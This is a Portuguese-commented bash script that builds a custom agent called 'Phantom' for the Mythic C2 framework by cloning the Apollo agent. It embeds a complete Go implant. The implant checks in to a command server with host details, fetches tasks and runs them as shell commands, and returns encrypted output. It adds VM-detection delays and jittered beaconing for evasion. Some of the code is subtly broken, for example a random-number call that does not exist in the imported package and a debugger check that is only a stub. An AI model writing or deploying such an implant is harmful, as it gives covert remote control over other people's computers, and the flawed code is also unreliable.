#!/bin/bash

echo "[+] Criando Phantom baseado na estrutura do Apollo"

cd /root/Mythic

# Verificar se Apollo existe
if [ ! -d "InstalledServices/apollo" ]; then
    echo "[-] Apollo não encontrado em InstalledServices"
    ls -la InstalledServices/
    exit 1
fi

# Copiar estrutura do Apollo
echo "[+] Copiando estrutura do Apollo..."
sudo cp -r InstalledServices/apollo InstalledServices/phantom

# Atualizar docker-compose para incluir phantom
echo "[+] Atualizando docker-compose..."
sudo sed -i '/apollo:/,/^$/{ s/apollo/phantom/g; s/Apollo/Phantom/g }' docker-compose.yml

# Personalizar arquivos do Phantom
echo "[+] Personalizando Phantom..."

# Atualizar config.json
sudo sed -i 's/"name": "apollo"/"name": "phantom"/g' InstalledServices/phantom/config.json
sudo sed -i 's/"description": ".*"/"description": "Advanced C2 agent with extensive evasion capabilities"/g' InstalledServices/phantom/config.json
sudo sed -i 's/"author": ".*"/"author": "@phantom"/g' InstalledServices/phantom/config.json

# Atualizar Payload_Type/__init__.py
sudo sed -i 's/apollo/phantom/g' InstalledServices/phantom/Payload_Type/__init__.py
sudo sed -i 's/Apollo/Phantom/g' InstalledServices/phantom/Payload_Type/__init__.py

# Substituir código do agente por nosso código Go
sudo tee InstalledServices/phantom/agent_code/main.go > /dev/null << 'EOF'
package main

import (
    "bytes"
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "io"
    "io/ioutil"
    "net/http"
    "os"
    "os/exec"
    "runtime"
    "time"
    "unsafe"
)

// Estruturas para comunicação
type CheckinMessage struct {
    Action string `json:"action"`
    UUID   string `json:"uuid"`
    User   string `json:"user"`
    Host   string `json:"host"`
    PID    int    `json:"pid"`
    IP     string `json:"ip"`
    Domain string `json:"domain"`
    OS     string `json:"os"`
    Arch   string `json:"architecture"`
}

type TaskMessage struct {
    Action   string `json:"action"`
    TaskID   string `json:"task_id"`
    Command  string `json:"command"`
    Params   string `json:"parameters"`
}

type ResponseMessage struct {
    Action     string `json:"action"`
    TaskID     string `json:"task_id"`
    UserOutput string `json:"user_output"`
    Completed  bool   `json:"completed"`
}

// Configurações globais
var (
    serverURL = "{{.server_url}}"
    uuid      = generateUUID()
    aesKey    = []byte("{{.aes_key}}")
    sleepTime = {{.sleep}}
    jitter    = {{.jitter}}
)

// Técnicas de evasão básicas
func isDebuggerPresent() bool {
    if runtime.GOOS == "windows" {
        // Simulação da verificação IsDebuggerPresent
        return false
    }
    return false
}

func checkVirtualMachine() bool {
    // Verificações básicas de VM
    hostname, _ := os.Hostname()
    vmIndicators := []string{"vmware", "vbox", "virtualbox", "qemu", "kvm", "xen"}
    
    for _, indicator := range vmIndicators {
        if contains(hostname, indicator) {
            return true
        }
    }
    return false
}

func contains(s, substr string) bool {
    return len(s) >= len(substr) && s[len(s)-len(substr):] == substr
}

func main() {
    fmt.Println("[+] Phantom C2 Agent Starting...")
    
    // Verificações de evasão
    if isDebuggerPresent() {
        os.Exit(0)
    }
    
    if checkVirtualMachine() {
        // Delay em ambiente VM
        time.Sleep(30 * time.Second)
    }
    
    // Checkin inicial
    if !checkin() {
        os.Exit(1)
    }
    
    // Loop principal
    for {
        getTasks()
        sleepWithJitter()
    }
}

func generateUUID() string {
    b := make([]byte, 16)
    rand.Read(b)
    return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
}

func checkin() bool {
    hostname, _ := os.Hostname()
    user := os.Getenv("USER")
    if user == "" {
        user = os.Getenv("USERNAME")
    }
    
    msg := CheckinMessage{
        Action: "checkin",
        UUID:   uuid,
        User:   user,
        Host:   hostname,
        PID:    os.Getpid(),
        IP:     "127.0.0.1",
        Domain: "",
        OS:     runtime.GOOS,
        Arch:   runtime.GOARCH,
    }
    
    data, _ := json.Marshal(msg)
    encryptedData := encrypt(data)
    
    resp, err := http.Post(serverURL+"/api/v1.4/agent_message", 
                          "application/json", 
                          bytes.NewBuffer([]byte(encryptedData)))
    if err != nil {
        return false
    }
    defer resp.Body.Close()
    
    return resp.StatusCode == 200
}

func getTasks() {
    resp, err := http.Get(serverURL + "/api/v1.4/agent_message?uuid=" + uuid)
    if err != nil {
        return
    }
    defer resp.Body.Close()
    
    body, _ := ioutil.ReadAll(resp.Body)
    decryptedData := decrypt(string(body))
    
    var tasks []TaskMessage
    json.Unmarshal(decryptedData, &tasks)
    
    for _, task := range tasks {
        output := executeCommand(task.Command)
        sendResponse(task.TaskID, output)
    }
}

func executeCommand(command string) string {
    var cmd *exec.Cmd
    
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd", "/C", command)
    } else {
        cmd = exec.Command("/bin/sh", "-c", command)
    }
    
    output, err := cmd.Output()
    if err != nil {
        return fmt.Sprintf("Error: %v", err)
    }
    
    return string(output)
}

func sendResponse(taskID, output string) {
    msg := ResponseMessage{
        Action:     "post_response",
        TaskID:     taskID,
        UserOutput: output,
        Completed:  true,
    }
    
    data, _ := json.Marshal(msg)
    encryptedData := encrypt(data)
    
    http.Post(serverURL+"/api/v1.4/agent_message", 
             "application/json", 
             bytes.NewBuffer([]byte(encryptedData)))
}

func encrypt(data []byte) string {
    if len(aesKey) == 0 {
        return base64.StdEncoding.EncodeToString(data)
    }
    
    block, _ := aes.NewCipher(aesKey)
    gcm, _ := cipher.NewGCM(block)
    
    nonce := make([]byte, gcm.NonceSize())
    io.ReadFull(rand.Reader, nonce)
    
    ciphertext := gcm.Seal(nonce, nonce, data, nil)
    return base64.StdEncoding.EncodeToString(ciphertext)
}

func decrypt(data string) []byte {
    if len(aesKey) == 0 {
        decoded, _ := base64.StdEncoding.DecodeString(data)
        return decoded
    }
    
    decoded, _ := base64.StdEncoding.DecodeString(data)
    
    block, _ := aes.NewCipher(aesKey)
    gcm, _ := cipher.NewGCM(block)
    
    nonceSize := gcm.NonceSize()
    nonce, ciphertext := decoded[:nonceSize], decoded[nonceSize:]
    
    plaintext, _ := gcm.Open(nil, nonce, ciphertext, nil)
    return plaintext
}

func sleepWithJitter() {
    baseTime := time.Duration(sleepTime) * time.Second
    jitterRange := int64(float64(baseTime) * float64(jitter) / 100.0)
    
    if jitterRange > 0 {
        jitterTime := time.Duration(rand.Int63n(jitterRange))
        baseTime += jitterTime
    }
    
    time.Sleep(baseTime)
}
EOF

# Criar go.mod para o agente
sudo tee InstalledServices/phantom/agent_code/go.mod > /dev/null << 'EOF'
module phantom

go 1.21

require ()
EOF

# Registrar no Mythic
echo "[+] Registrando Phantom no Mythic..."
sudo ./mythic-cli install folder InstalledServices/phantom

# Iniciar container do Phantom
echo "[+] Iniciando container Phantom..."
sudo docker-compose up -d phantom

echo "[+] Phantom criado e instalado com sucesso!"
echo "[+] Verificando status..."
sudo ./mythic-cli status

echo ""
echo "[+] Phantom está pronto para uso!"
echo "    - Acesse: https://localhost:7443"
echo "    - Crie payload tipo 'phantom'"
echo "    - Configure parâmetros de build"